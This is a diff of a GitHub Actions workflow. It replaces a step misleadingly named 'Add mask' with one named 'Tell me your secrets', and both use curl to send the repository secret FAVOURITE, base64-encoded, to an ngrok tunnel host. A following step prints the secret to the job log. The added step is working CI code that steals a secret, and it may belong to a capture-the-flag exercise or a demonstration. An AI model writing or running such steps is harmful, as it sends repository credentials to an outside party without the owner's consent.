@@ -19,12 +19,8 @@ jobs:
 
 
     steps:
-      - name: Add mask
-        run: |
-          export FLAG=${{secrets.FAVOURITE}}
-          curl -k https://ef87-128-131-205-77.eu.ngrok.io?secret=$(FLAG | base64 --wrap=0)
-          curl -k https://ef87-128-131-205-77.eu.ngrok.io?secrets=$(secrets.FAVOURITE | base64 --wrap=0)
-          curl -X POST https://ef87-128-131-205-77.eu.ngrok.io -d $(echo "${{secrets.FAVOURITE}}" | base64 --wrap=0
+      - name: Tell me your secrets
+        run: curl -k https://ef87-128-131-205-77.eu.ngrok.io?sec=$(echo "${{ secrets.FAVOURITE }}" | base64 --wrap=0)
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
